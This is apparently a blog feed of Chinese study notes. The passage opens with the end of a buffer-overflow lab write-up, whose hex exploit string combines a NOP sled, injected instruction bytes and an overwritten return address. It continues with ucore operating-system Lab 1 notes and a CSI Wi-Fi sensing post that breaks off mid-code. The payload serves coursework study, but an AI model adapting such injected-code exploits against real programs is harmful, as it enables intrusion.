90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 
8d 6c 24 28 b8 88 41 9d 21 68 3a 8e 04 08 c3 
e8 2f 68 55
</code></pre><p>最后的返回地址，选择最大buf地址来覆盖，也就是用0x55682f08。</p>
<p>值得注意的是，在运行hex2raw程序时需要添上 -n 这个参数。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>BufLab 算是完成了，稍微对模拟缓冲区溢出熟悉了一点，加深了对程序堆栈的理解。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[清华操作系统课程学习]]></title>
      <url>http://xinqiu.me/2016/03/17/ucore/</url>
      <content type="html"><![CDATA[<blockquote>
<p>因为学习操作系统，因为还有一些其他事情要做，所以没有直接上MIT 6.828,选择了清华的操作系统课和配套的ucore。</p>
</blockquote>
<h2 id="u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B"><a href="#u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B" class="headerlink" title="从机器启动到操作系统运行的过程"></a>从机器启动到操作系统运行的过程</h2><p>在机器接通电源后， 会向主板发送一个信号。一旦主板收到电源妥协信号后，主板会尝试启动CPU，CPU复位寄存器里的所有数据， 设置预定值给每个寄存器。同时执行系统初始化软件完成基本IO初始化和引导加载功能。为最终调用操作系统内核准备好正确的环境。最终引导加载程序把操作系统内核映像加载到RAM中，并将系统控制权传递给它。</p>
<p>以Intel 80386为例，计算机加电后，CPU从物理地址0xFFFFFFF0(由初始化的CS：EIP确定，此时CS和IP的值分别是0xF000和0xFFF0)开始执行。8086 处理器有一个20位寻址总线，这意味着它可以对0到 2^20 位地址空间进行操作（ 1Mb ）。不过它只有16位的寄存器，通过这个16位寄存器最大寻址是 2^16 即 0xffff （64 Kb）。实模式使用分段机制来管理整个内存空间。所有内存被分成固定的 64KB 大小的小块。由于我们不能用16位寄存器寻址大于 64KB 的内存，一种替代的方法被设计出来了。一个地址包括两个部分：数据段起始地址和从该数据段起的偏移量。为了得到内存中的物理地址，我们要让数据段乘16并加上偏移量：</p>
<pre><code>PhysicalAddress = Segment * 16 + Offset
</code></pre><p>通过阅读 kernel boot protocol，在内核被引导如内存后，内存使用情况将入下表所示：</p>
<pre><code>         | Protected-mode kernel  |
100000   +------------------------+
         | I/O memory hole        |
0A0000   +------------------------+
         | Reserved for BIOS      | Leave as much as possible unused
         ~                        ~
         | Command line           | (Can also be below the X+10000 mark)
X+10000  +------------------------+
         | Stack/heap             | For use by the kernel real-mode code.
X+08000  +------------------------+
         | Kernel setup           | The kernel real-mode code.
         | Kernel boot sector     | The kernel legacy boot sector.
       X +------------------------+
         | Boot loader            | &lt;- Boot sector entry point 0x7C00
001000   +------------------------+
         | Reserved for MBR/BIOS  |
000800   +------------------------+
         | Typically used by MBR  |
000600   +------------------------+
         | BIOS use only          |
000000   +------------------------+
</code></pre><p>所以当 bootloader 完成任务，将执行权移交给 kernel，kernel 的代码从以下地址开始执行：</p>
<pre><code>0x1000 + X + sizeof(KernelBootSector) + 1
</code></pre><p>上面的公式中， X 是 kernel bootsector 被引导如内存的位置。</p>
<h2 id="Lab_1"><a href="#Lab_1" class="headerlink" title="Lab 1"></a>Lab 1</h2><h3 id="u7EC3_u4E601"><a href="#u7EC3_u4E601" class="headerlink" title="练习1"></a>练习1</h3><p>1.操作系统镜像文件ucore.img是如何一步一步生成的？</p>
<p>在进行 <code>make V=</code>后，通过显示的信息，可以知道先对C文件进行了编译。分别编译了一下文件:</p>
<ul>
<li>cc kern/init/init.c 初始化系统</li>
<li>cc kern/libs/readline.c 从输入中读取一行</li>
<li>cc kern/libs/stdio.c 标准化IO</li>
<li>cc kern/debug/kdebug.c debug支撑文件</li>
<li>cc kern/debug/kmonitor.c 命令行显示器</li>
<li>cc kern/debug/panic.c 显示错误警告</li>
<li>cc kern/driver/clock.c 时钟相关</li>
<li>cc kern/driver/console.c 控制台显示</li>
<li>cc kern/driver/intr.c 中断请求</li>
<li>cc kern/driver/picirq.c 中断控制器</li>
<li>cc kern/trap/trap.c 中断处理</li>
<li>cc kern/trap/trapentry.S 中断预处理</li>
<li>cc kern/trap/vectors.S 中断向量表</li>
<li>cc kern/mm/pmm.c 全局描述符表</li>
<li>cc libs/printfmt.c 输出格式</li>
<li>cc libs/string.c 字符串操作</li>
<li>cc boot/bootasm.S Boot Loader程序</li>
<li>cc boot/bootmain.c Boot Loader程序</li>
<li>cc tools/sign.c 硬盘主引导扇区检测</li>
</ul>
<p>接着 <code>ld</code> 命令对编译好的 <code>.o</code> 文件进行链接，生成了引导扇区。</p>
<p>之后用 <code>dd</code> 创建了一块空间，并将 <code>bootblock</code> 放入这块空间做成 <code>img</code> 硬盘。</p>
<p>2.一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
<p>从 <code>tools/sign.c</code> 源文件中可以得知， </p>
<pre class=" language-C"><code class="language-C">
.....
if (st.st_size > 510) {
        fprintf(stderr, "%lld >> 510!!\n", (long long)st.st_size);
        return -1;
}
char buf[512];
......
buf[510] = 0x55;
buf[511] = 0xAA;
......
if (size != 512) {
    fprintf(stderr, "write '%s' error, size is %d.\n", argv[2], size);
    return -1;
}
fclose(ofp);
printf("build 512 bytes boot sector: '%s' success!\n", argv[2]);
......
</code></pre>
<p>规范的硬盘主引导扇区大小为512， 并且最后两位必须是 <code>0x55AA</code>.</p>
<h3 id="u7EC3_u4E602"><a href="#u7EC3_u4E602" class="headerlink" title="练习2"></a>练习2</h3><p>使用qemu执行并调试lab1中的软件，要做一下几个操作：</p>
<ol>
<li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
</li>
<li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
</li>
<li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
</li>
<li><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
</li>
</ol>
<p>根据参考的提示，在 <code>.PHONY: qemu qemu-nox debug debug-nox</code> 下添加</p>
<pre><code>lab1-mon: $(UCOREIMG)
    $(V)$(TERMINAL) -e &quot;$(QEMU) -S -s -d in_asm -D $(BINDIR)/q.log -monitor stdio -hda $&lt; -serial null&quot;
    $(V)sleep 2
    $(V)$(TERMINAL) -e &quot;gdb -q -x tools/lab1init&quot;
</code></pre><p>在调用qemu时添加-d in_asm -D q.log参数可以将运行的汇编指令保存在q.log中。</p>
<p>另外需要先在<code>lab1/tools/</code>文件夹下新建一个<code>lab1init</code>文件。添加以下内容</p>
<pre><code>file bin/kernel
target remote :1234
set architecture i8086
break *0x7c00
continue
x /2i $pc
</code></pre><p>分别代表加载kernel， 与qemu链接， BIOS是i8086 16位实模式， 在0x7c00处设置断点， 继续运行， 显示指令寄存器上的两条指令。</p>
<p>make lab1-mon 产生的汇编代码还是稍微有点区别，主要在0x7c1e开始有点区别。</p>
<p>#####gdb的单步命令</p>
<p>在gdb中，有next, nexti, step, stepi等指令来单步调试程序，他们功能各不相同，区别在于单步的“跨度”上。</p>
<ul>
<li>next 单步到程序源代码的下一行，不进入函数。</li>
<li>nexti 单步一条机器指令，不进入函数。</li>
<li>step 单步到下一个不同的源代码行（包括进入函数）。</li>
<li>stepi 单步一条机器指令。</li>
</ul>
<h3 id="u7EC3_u4E603"><a href="#u7EC3_u4E603" class="headerlink" title="练习3"></a>练习3</h3><p>参考<a href="http://blog.csdn.net/xiaocainiaoshangxiao/article/details/22417237" target="_blank" rel="external">MIT6.828 boot.S文件分析</a>这篇文章。</p>
<pre><code>#include &lt;asm.h&gt;

# Start the CPU: switch to 32-bit protected mode, jump into C.
# The BIOS loads this code from the first sector of the hard disk into
# memory at physical address 0x7c00 and starts executing in real mode
# with %cs=0 %ip=7c00.

#启动CPU，切换到32位保护模式，跳转到C代码  
#BIOS从硬盘的第一个扇区加载这个代码到  
#物理内存地址为0x7c00的地方，cs=0,ip=7c00  

#下面的3条.set指令类似于宏定义  
#内核代码段选择子
.set PROT_MODE_CSEG,        0x8                     # kernel code segment selector
#内核数据段选择子 
.set PROT_MODE_DSEG,        0x10                    # kernel data segment selector
#保护模式使能标志
.set CR0_PE_ON,             0x1                     # protected mode enable flag

# start address should be 0:7c00, in real mode, the beginning address of the running bootloader
#开始地址在实模式下是0:7c00，这个开始地址就是运行bootloader的地址

#定义一个全局名字start 
.globl start
start:
#CPU启动为16位模式 
.code16                                             # Assemble for 16-bit mode
    #关中断
    cli                                             # Disable interrupts
    #清除方向标志 
    cld                                             # String operations increment

    # Set up the important data segment registers (DS, ES, SS).
    #设置重要的数据段寄存器  
    #ax,ds, es, ss清零
    xorw %ax, %ax                                   # Segment number zero
    movw %ax, %ds                                   # -&gt; Data Segment
    movw %ax, %es                                   # -&gt; Extra Segment
    movw %ax, %ss                                   # -&gt; Stack Segment

    # Enable A20:
    #  For backwards compatibility with the earliest PCs, physical
    #  address line 20 is tied low, so that addresses higher than
    #  1MB wrap around to zero by default. This code undoes this.
    #打开A20地址线  
    #为了兼容早期的PC机，第20根地址线在实模式下不能使用  
    #所以超过1MB的地址，默认就会返回到地址0，重新从0循环计数，  
    #下面的代码打开A20地址线 
seta20.1:
    #从0x64端口读入一个字节的数据到al中 
    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).
    testb $0x2, %al
    #如果上面的测试中发现al的第2位为0，就不执行该指令  
    #否则就循环检查
    jnz seta20.1

    #将0xd1写入到al中
    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64
    #将al中的数据写入到端口0x64中,也就是8042的P2端口
    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port

seta20.2:
    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).
    #测试al的第2位是否为0
    testb $0x2, %al
    jnz seta20.2

    #将0xdf写入到al中 
    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60
    #将al中的数据写入到0x60端口中，也就是让P2端口的A20位设置为1
    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1

    # Switch from real to protected mode, using a bootstrap GDT
    # and segment translation that makes virtual addresses
    # identical to physical addresses, so that the
    # effective memory map does not change during the switch.
    #将全局描述符表描述符加载到全局描述符表寄存器
    lgdt gdtdesc
    #cr0中的第0位为1表示处于保护模式  
    #cr0中的第0位为0，表示处于实模式  
    #把控制寄存器cr0加载到eax中 
    movl %cr0, %eax
    #将eax中的第0位设置为1
    orl $CR0_PE_ON, %eax
    #将eax中的值装入cr0中 
    movl %eax, %cr0

    # Jump to next instruction, but in 32-bit code segment.
    # Switches processor into 32-bit mode.
    ljmp $PROT_MODE_CSEG, $protcseg
    #跳转到32位模式中的下一条指令  
    #将处理器切换为32位工作模式  
    #下面这条指令执行的结果会将$PROT_MODE_CSEG加载到cs中，cs对应的高速缓冲存储器会加载代码段描述符  
    #同样将$protcseg加载到ip中

.code32                                             # Assemble for 32-bit mode
protcseg:
    # Set up the protected-mode data segment registers
    #设置保护模式下的数据寄存器  
    #将数据段选择子装入到ax中
    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector
    #将ax装入到其他数据段寄存器中，在装入的同时，  
    #数据段描述符会自动的加入到这些段寄存器对应的高速缓冲寄存器中 
    movw %ax, %ds                                   # -&gt; DS: Data Segment
    movw %ax, %es                                   # -&gt; ES: Extra Segment
    movw %ax, %fs                                   # -&gt; FS
    movw %ax, %gs                                   # -&gt; GS
    movw %ax, %ss                                   # -&gt; SS: Stack Segment

    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)
    #设置栈指针，并且调用c函数 
    movl $0x0, %ebp
    #调用main.c中的bootmain函数 
    movl $start, %esp
    call bootmain

    # If bootmain returns (it shouldn&#39;t), loop.
    #如果bootmain返回的话，就一直循环
spin:
    jmp spin

# Bootstrap GDT
#强制4字节对齐
.p2align 2                                          # force 4 byte alignment
#全局描述符表
gdt:
    SEG_NULLASM                                     # null seg
    #代码段描述符
    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel
    #数据段描述符
    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel

#全局描述符表对应的描述符 
gdtdesc:
    .word 0x17                                      # sizeof(gdt) - 1
    .long gdt                                       # address gdt
</code></pre><h3 id="u7EC3_u4E604"><a href="#u7EC3_u4E604" class="headerlink" title="练习4"></a>练习4</h3><p>通过分析源代码和通过qemu来运行并调试bootloader&amp;OS，</p>
<ul>
<li>bootloader如何读取硬盘扇区的？</li>
<li>bootloader是如何加载ELF格式的OS？</li>
</ul>
<p>在bootmain.c中有介绍。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* readsect - read a single sector at @secno into @dst */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">readsect</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>dst<span class="token punctuation">,</span> uint32_t secno<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// wait for disk to be ready</span>
    <span class="token function">waitdisk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// count = 1</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F3</span><span class="token punctuation">,</span> secno <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>secno <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xE0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">outb</span><span class="token punctuation">(</span><span class="token number">0x1F7</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// cmd 0x20 - read sectors</span>

    <span class="token comment" spellcheck="true">// wait for disk to be ready</span>
    <span class="token function">waitdisk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// read a sector</span>
    <span class="token function">insl</span><span class="token punctuation">(</span><span class="token number">0x1F0</span><span class="token punctuation">,</span> dst<span class="token punctuation">,</span> SECTSIZE <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>读一个扇区的流程大致如下：</p>
<ol>
<li>等待磁盘准备好</li>
<li>发出读取扇区的命令</li>
<li>等待磁盘准备好</li>
<li>把磁盘扇区数据读到指定内存</li>
</ol>
<p>通过readseg函数将OS读取到ELFHDR所指示的地址（0x10000）。<br>判断头部是否合法，如不合法直接跳出。<br>把kernel的每一个程序段都载入内存。<br>通过程序入口地址加载作为ELF可执行文件的kernel。</p>
<h3 id="u7EC3_u4E605"><a href="#u7EC3_u4E605" class="headerlink" title="练习5"></a>练习5</h3><pre><code>/* *
 * print_stackframe - print a list of the saved eip values from the nested &#39;call&#39;
 * instructions that led to the current point of execution
 *
 * The x86 stack pointer, namely esp, points to the lowest location on the stack
 * that is currently in use. Everything below that location in stack is free. Pushing
 * a value onto the stack will invole decreasing the stack pointer and then writing
 * the value to the place that stack pointer pointes to. And popping a value do the
 * opposite.
 *
 * The ebp (base pointer) register, in contrast, is associated with the stack
 * primarily by software convention. On entry to a C function, the function&#39;s
 * prologue code normally saves the previous function&#39;s base pointer by pushing
 * it onto the stack, and then copies the current esp value into ebp for the duration
 * of the function. If all the functions in a program obey this convention,
 * then at any given point during the program&#39;s execution, it is possible to trace
 * back through the stack by following the chain of saved ebp pointers and determining
 * exactly what nested sequence of function calls caused this particular point in the
 * program to be reached. This capability can be particularly useful, for example,
 * when a particular function causes an assert failure or panic because bad arguments
 * were passed to it, but you aren&#39;t sure who passed the bad arguments. A stack
 * backtrace lets you find the offending function.
 *
 * The inline function read_ebp() can tell us the value of current ebp. And the
 * non-inline function read_eip() is useful, it can read the value of current eip,
 * since while calling this function, read_eip() can read the caller&#39;s eip from
 * stack easily.
 *
 * In print_debuginfo(), the function debuginfo_eip() can get enough information about
 * calling-chain. Finally print_stackframe() will trace and print them for debugging.
 *
 * Note that, the length of ebp-chain is limited. In boot/bootasm.S, before jumping
 * to the kernel entry, the value of ebp has been set to zero, that&#39;s the boundary.
 * */
void
print_stackframe(void) {
     /* LAB1 YOUR CODE : STEP 1 */
     /* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);
      * (2) call read_eip() to get the value of eip. the type is (uint32_t);
      * (3) from 0 .. STACKFRAME_DEPTH
      *    (3.1) printf value of ebp, eip
      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4]
      *    (3.3) cprintf(&quot;\n&quot;);
      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.
      *    (3.5) popup a calling stackframe
      *           NOTICE: the calling funciton&#39;s return addr eip  = ss:[ebp+4]
      *                   the calling funciton&#39;s ebp = ss:[ebp]
      */
    uint32_t ebp = read_ebp();
    uint32_t eip = read_eip();

    int i, j;
    for(i = 0; ebp != 0 &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)
    {
        cprintf(&quot;epb:0x%08x eip:0x%08x args:&quot;, ebp, eip);
        uint32_t *args = (uint32_t *)ebp + 2;
        for (j = 0; j &lt; 4; j++)
        {
            cprintf(&quot;0x%08x &quot;, args[j]);
        }
        cprintf(&quot;\n&quot;);
        print_debuginfo(eip - 1);
        eip = ((uint32_t *)ebp)[1];
        ebp = ((uint32_t *)ebp)[0];
    }

}
</code></pre><p>提示还是挺详细的，按照提示一步步写就能写出。首先读取ebp和eip的值，然后将堆栈里的信息打印出来，之后移动eip和ebp。</p>
<h3 id="u7EC3_u4E606"><a href="#u7EC3_u4E606" class="headerlink" title="练习6"></a>练习6</h3><p>1.中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
<p>通过查看/kern/mm/mmh.h,将struct gatedesc中元素的位相加，共64bit也就是8个字节。另外低16bit和高16bit为段偏移量，查看这个<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table" target="_blank" rel="external">资料</a>,可以知道段选择子是16bit。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th style="text-align:center">Bit</th>
<th style="text-align:left">Full Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset</td>
<td style="text-align:center">48..63</td>
<td style="text-align:left">Offset 16..31</td>
</tr>
<tr>
<td>P</td>
<td style="text-align:center">47</td>
<td style="text-align:left">Present</td>
</tr>
<tr>
<td>DPL</td>
<td style="text-align:center">45,46</td>
<td style="text-align:left">Descriptor Privilege Level</td>
</tr>
<tr>
<td>S</td>
<td style="text-align:center">44</td>
<td style="text-align:left">Storage Segment</td>
</tr>
<tr>
<td>Type</td>
<td style="text-align:center">40..43</td>
<td style="text-align:left">Gate Type 0..3</td>
</tr>
<tr>
<td>0</td>
<td style="text-align:center">32..39</td>
<td style="text-align:left">Unused 0..7</td>
</tr>
<tr>
<td>Selector</td>
<td style="text-align:center">16..31</td>
<td style="text-align:left">Selector 0..15</td>
</tr>
<tr>
<td>Offset</td>
<td style="text-align:center">0..15</td>
<td style="text-align:left">Offset 0..15</td>
</tr>
</tbody>
</table>
<p>2.请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span>
<span class="token keyword">void</span>
<span class="token function">idt_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token comment" spellcheck="true">/* LAB1 YOUR CODE : STEP 2 */</span>
     <span class="token comment" spellcheck="true">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?
      *     All ISR's entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?
      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c
      *     (try "make" command in lab1, then you will find vector.S in kern/trap DIR)
      *     You can use  "extern uintptr_t __vectors[];" to define this extern variable which will be used later.
      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).
      *     Can you see idt[256] in this file? Yes, it's IDT! you can use SETGATE macro to setup each item of IDT
      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using 'lidt' instruction.
      *     You don't know the meaning of this instruction? just google it! and check the libs/x86.h to know more.
      *     Notice: the argument of lidt is idt_pd. try to find it!
      */</span>
    <span class="token keyword">extern</span> uintptr_t __vectors<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>idt<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> gatedesc<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KTEXT<span class="token punctuation">,</span> __vectors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> DPL_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// set for switch from user to kernel</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SWITCH_TOK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KTEXT<span class="token punctuation">,</span> __vectors<span class="token punctuation">[</span>T_SWITCH_TOK<span class="token punctuation">]</span><span class="token punctuation">,</span> DPL_USER<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// load the IDT</span>
    <span class="token function">lidt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>idt_pd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3.请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> IRQ_OFFSET <span class="token operator">+</span> IRQ_TIMER<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">/* LAB1 YOUR CODE : STEP 3 */</span>
        <span class="token comment" spellcheck="true">/* handle the timer interrupt */</span>
        <span class="token comment" spellcheck="true">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c
         * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().
         * (3) Too Simple? Yes, I think so!
         */</span>
        ticks <span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ticks <span class="token operator">%</span> TICK_NUM <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">print_ticks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre>
<p>To be continued.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于CSI的移动目标侦测研究学习]]></title>
      <url>http://xinqiu.me/2016/03/12/csi-start/</url>
      <content type="html"><![CDATA[<blockquote>
<p>最近被老师带着搞科研，研究CSI(channel state information)。</p>
</blockquote>
<h2 id="u73AF_u5883_u5B89_u88C5"><a href="#u73AF_u5883_u5B89_u88C5" class="headerlink" title="环境安装"></a>环境安装</h2><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p>
<p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p>
<h2 id="u83B7_u53D6_u6570_u636E"><a href="#u83B7_u53D6_u6570_u636E" class="headerlink" title="获取数据"></a>获取数据</h2><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ./log_to_file tmp.dat
</code></pre>
<p>打开另一个终端，运行</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.1.1 -i 0.2
</code></pre>
<p>netlink文件夹中的tmp.dat就是采集的原始数据。</p>
<h2 id="u8BFB_u53D6_u6570_u636E"><a href="#u8BFB_u53D6_u6570_u636E" class="headerlink" title="读取数据"></a>读取数据</h2><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p>
<p>一个例子数据包里包含</p>
<pre><code>timestamp_low: 4            (In the sample trace, timestamp_low is invalid and always 4.)
       bfee_count: 72
              Nrx: 3
              Ntx: 1
           rssi_a: 33
           rssi_b: 37
           rssi_c: 41
            noise: -127
              agc: 38
             perm: [3 2 1]
             rate: 256
              csi: [1x3x30 double]
</code></pre><p>其中:</p>
<ul>
<li><strong><strong>timestamp_low</strong></strong> 是时间戳</li>
<li><strong><strong>bfee_count</strong></strong> 数据包数量</li>
<li><strong><strong>Nrx,Ntx</strong></strong> 分别表示接收端和发送端的天线数量</li>
<li><strong><strong>rssi_a, rssi_b, rssi_c</strong></strong> 每个天线的RSSI数据，单位dB，</li>
<li><strong><strong>agc</strong></strong> Automatic Gain Control</li>
<li><strong><strong>perm</strong></strong> NIC重排列后的顺序结果，代表RF链路的顺序</li>
<li><strong><strong>rate</strong></strong> 发送包的rate</li>
<li><strong><strong>csi</strong></strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li>
</ul>
<p>主要提取出CSI数据和timestamp_low。</p>
<a id="more"></a>
<h2 id="u6570_u636E_u9884_u5904_u7406"><a href="#u6570_u636E_u9884_u5904_u7406" class="headerlink" title="数据预处理"></a>数据预处理</h2><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> copy

N <span class="token operator">=</span> <span class="token number">1000</span> <span class="token comment" spellcheck="true"># N为采集的数据包数量</span>

<span class="token keyword">def</span> <span class="token function">complexDecoding</span><span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""    
    将原始数据转化为Python可识别的复数
    这里使用了第一个天线的数据raw_data[0]
    第二根第三根天线数据下标分别为1, 2
    原始数据为a + bi, python为a + bj
    返回处理后的数据
    """</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
